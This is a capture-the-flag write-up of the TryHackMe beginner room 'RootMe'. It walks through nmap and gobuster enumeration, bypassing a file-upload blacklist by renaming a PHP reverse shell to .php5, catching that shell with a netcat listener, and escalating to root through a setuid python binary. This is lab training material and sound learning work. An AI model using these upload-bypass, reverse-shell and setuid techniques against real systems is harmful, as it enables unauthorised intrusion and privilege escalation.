# RootMe
> A ctf for beginners, can you root me?

[RootMe](https://www.tryhackme.com/room/rrootme) is created by
[ReddyyZ](https://www.tryhackme.com/p/ReddyyZ).

## Reconnaissance

Results of nmap scan:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times
will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 19:33 EDT
Nmap scan report for 10.10.11.81
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol
2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.06 seconds
```

We see that port 22 and 80 are open. The web server is running Apache version
2.4.29. 

I navigated to the web server in my browser and did not find anything
interesting in the source code or within robots.txt file. Time to run gobuster
to search for hidden directories.

```
$ gobuster dir -u http://10.10.11.81 -w /usr/share/wordlists/dirb/common.txt|
tee gobuster_scan.txt         1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.81
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/22 19:36:03 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.11.81/css/]
/index.php            (Status: 200) [Size: 616]                              
/js                   (Status: 301) [Size: 307] [--> http://10.10.11.81/js/] 
/panel                (Status: 301) [Size: 310] [--> http://10.10.11.81/panel/]
/server-status        (Status: 403) [Size: 276]                                
/uploads              (Status: 301) [Size: 312] [-->
http://10.10.11.81/uploads/]
                                                                                 
===============================================================
2021/03/22 19:37:38 Finished
===============================================================
```

## Exploitation

From the gobuster scan we see there are a /panel and /uploads folder. We can
upload files in /panel and they will be saved in /uploads. Meaning, we can
easily get a reverse shell!

I tried uploading a .pl (perl) and .php reverse shell, but the former did not
run and the latter is blocked by a blacklist filter.

After reading this post [on bypassing file upload
restrictions](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/)
I found a solution.

I editted my php reverse shell to have a .php5 file extension and was able to
get a reverse shell.

```
$ mv php-revshell.php php-revshell.php5
```

```
$ nc -nlvp 4444                                      
listening on [any] 4444 ...
connect to [10.2.8.243] from (UNKNOWN) [10.10.11.81] 35172
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
x86_64 x86_64 x86_64 GNU/Linux
 23:52:35 up 24 min,  0 users,  load average: 0.00, 0.03, 0.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Finding user.txt

From here is was simple to find the user flag:

```
$ find / -iname "user.txt" 2>/dev/null 
/var/www/user.txt
$ cd /var/www
$ ls -la
total 20
drwxr-xr-x  3 www-data www-data 4096 Aug  4  2020 .
drwxr-xr-x 14 root     root     4096 Aug  4  2020 ..
-rw-------  1 www-data www-data  129 Aug  4  2020 .bash_history
drwxr-xr-x  6 www-data www-data 4096 Aug  4  2020 html
-rw-r--r--  1 www-data www-data   21 Aug  4  2020 user.txt
$ cat user.txt
XXX-REDACTED-XXX
```

## Privilege Escalation

First I [stabilized my reverse
shell](https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/) so it's not as wonky.

Search for files that have the setuid bit set:

```
www-data@rootme:/var/www$ find / -perm -u=s -type f 2>/dev/null
```

There's a ton of output, but the file that immediately stood out to me was
/usr/bin/python.

Using [this GTFObin
syntax](https://gtfobins.github.io/gtfobins/python/#file-read) we can read the
root file!

```
www-data@rootme:/var/www$ python -c 'print(open("/root/root.txt").read())'
XXX-REDACTED-XXX
```

That was a fun box!
